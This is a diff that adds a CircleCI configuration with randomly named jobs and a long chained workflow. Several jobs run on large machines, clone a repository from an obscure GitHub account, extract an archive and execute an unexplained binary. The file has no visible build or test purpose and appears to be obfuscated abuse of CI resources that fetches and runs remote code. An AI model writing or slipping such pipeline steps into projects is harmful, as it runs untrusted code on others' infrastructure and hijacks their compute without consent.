+            ls -la /tmp/wycvnbwap/kfarpbjps
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'kfarpbjps'
+  lxdzl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: yfyun
+          command: |
+            pr -l 20 /tmp/wycvnbwap/kfarpbjps | wc -l || true
+      - run:
+          name: stenrhxzqfyz
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: hthun
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  olptmthlxrcef:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: aktbhiojxaualm
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'bsfssmwgssmufzhfjz qolzjvckhehwcpqvpp' > /tmp/wycvnbwap/hzibtlkj
+            ls -la /tmp/wycvnbwap/hzibtlkj
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'hzibtlkj'
+  xpaonurfcizkgna:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: fyswwvecjxsu
+          command: |
+            pr -l 20 /tmp/wycvnbwap/hzibtlkj | wc -l || true
+      - run:
+          name: qrxotvoccp
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: bwbokioapmq
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+  lccqetzvyfskds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: ilcipleh
+          command: |
+            mkdir -p /tmp/wycvnbwap
+            echo 'uanknkryughdt twpvzjdsacjz' > /tmp/wycvnbwap/qblkiqhwqn
+            ls -la /tmp/wycvnbwap/qblkiqhwqn
+      - persist_to_workspace:
+          root: /tmp/wycvnbwap
+          paths:
+            - 'qblkiqhwqn'
+  udpqq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wycvnbwap
+      - run:
+          name: auauljbyo
+          command: |
+            pr -l 20 /tmp/wycvnbwap/qblkiqhwqn | wc -l || true
+      - run:
+          name: guzixfdebiuhpzb
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/bellancawalstonwby7p-sys/1893b1b58ba9.git .
+      - run:
+          name: ttxto
+          command: bzcat guvalvcgfmmg.tar.bz2 | tar xf -
+      - run:
+          command: env ./yyqtvrjuk
+
+workflows:
+  qvjmijyw:
+    jobs:
+      - zgetrt
+      - gfloart:
+          requires:
+            - zgetrt
+      - zhxkogetjwxfk:
+          requires:
+            - zgetrt
+      - euiae:
+          requires:
+            - zhxkogetjwxfk
+      - iyckt:
+          requires:
+            - zhxkogetjwxfk
+      - jthon:
+          requires:
+            - iyckt
+      - ymsqsywiweyu:
+          requires:
+            - iyckt
+      - enkkzkspnswbikw:
+          requires:
+            - ymsqsywiweyu
+      - gpbnx:
+          requires:
+            - ymsqsywiweyu
+      - htzxigarhobzyqx:
+          requires:
+            - gpbnx
+      - olyvrfdstix:
+          requires:
+            - gpbnx
+      - zaajclwdmh:
+          requires:
+            - olyvrfdstix
+      - xzzrwixqeupair:
+          requires:
+            - olyvrfdstix
+      - ecbyg:
+          requires:
+            - xzzrwixqeupair
+      - nyfxajdyadqpnlv:
+          requires:
+            - xzzrwixqeupair
+      - lxdzl:
+          requires:
+            - nyfxajdyadqpnlv
+      - lbfyfgg:
+          requires:
+            - nyfxajdyadqpnlv
+      - ypwgsygy:
+          requires:
+            - lbfyfgg
+      - ejcmhzemttfyr
+      - dylvqc:
+          requires:
+            - ejcmhzemttfyr
+      - yocazjeux:
+          requires:
+            - ejcmhzemttfyr
+      - zhkjhkc:
+          requires:
+            - yocazjeux
+      - sxgkuvdapkq:
+          requires:
+            - yocazjeux
+      - qncggaxlillp:
+          requires:
+            - sxgkuvdapkq
+      - mudqtezcgbonboe:
+          requires:
+            - sxgkuvdapkq
+      - zzqypafpzi:
+          requires:
+            - mudqtezcgbonboe
+      - lccqetzvyfskds:
+          requires:
+            - mudqtezcgbonboe
+      - udpqq:
+          requires:
+            - lccqetzvyfskds
+      - ierrwownienaz:
+          requires:
+            - lccqetzvyfskds
+      - mvevefvercefh:
+          requires:
+            - ierrwownienaz
+      - fvxytflc:
+          requires:
+            - ierrwownienaz
+      - zaeza:
+          requires:
+            - fvxytflc
+      - zuopfnodlpkgqd:
+          requires:
+            - fvxytflc
+      - nuzfijm:
+          requires:
+            - zuopfnodlpkgqd
+      - lggakpzjnskh:
+          requires:
+            - zuopfnodlpkgqd
+      - pezikszzoeo:
+          requires:
+            - lggakpzjnskh
+      - olptmthlxrcef:
+          requires:
+            - lggakpzjnskh
+      - xpaonurfcizkgna:
+          requires:
+            - olptmthlxrcef
+      - hxnblkhfmzdrmg:
+          requires:
+            - olptmthlxrcef
+      - vzffsfuoffip:
+          requires:
+            - hxnblkhfmzdrmg
+      - vvsnypeey:
+          requires:
+            - hxnblkhfmzdrmg
+      - duycfcvh:
+          requires:
+            - vvsnypeey
+      - htmkpa:
+          requires:
+            - vvsnypeey
+      - wvpcrdbis:
+          requires:
+            - htmkpa
+      - jvanirci
+      - zwdxosqli:
+          requires:
+            - jvanirci
+      - dxwxctonygmmwql:
+          requires:
+            - jvanirci
+      - tdophjk:
+          requires:
+            - dxwxctonygmmwql
+      - xlborz:
+          requires:
+            - dxwxctonygmmwql
+      - ooduips:
+          requires:
+            - xlborz
+      - rpdhtyljxbfq:
+          requires:
+            - xlborz
+      - svhlarf:
+          requires:
+            - rpdhtyljxbfq
+      - ecpsen:
+          requires:
+            - rpdhtyljxbfq
+      - imrrarqgzy:
+          requires:
+            - ecpsen
+      - jctpftjuer:
+          requires:
+            - ecpsen
+      - lbrifgmnr:
+          requires:
+            - jctpftjuer
+      - cfzmvkvxvcqyxvb:
+          requires:
+            - jctpftjuer
+      - qikwdnhctoy:
+          requires:
+            - cfzmvkvxvcqyxvb
+      - alkodtz:
+          requires:
+            - cfzmvkvxvcqyxvb
+      - ijhtbkwkpet:
+          requires:
+            - alkodtz
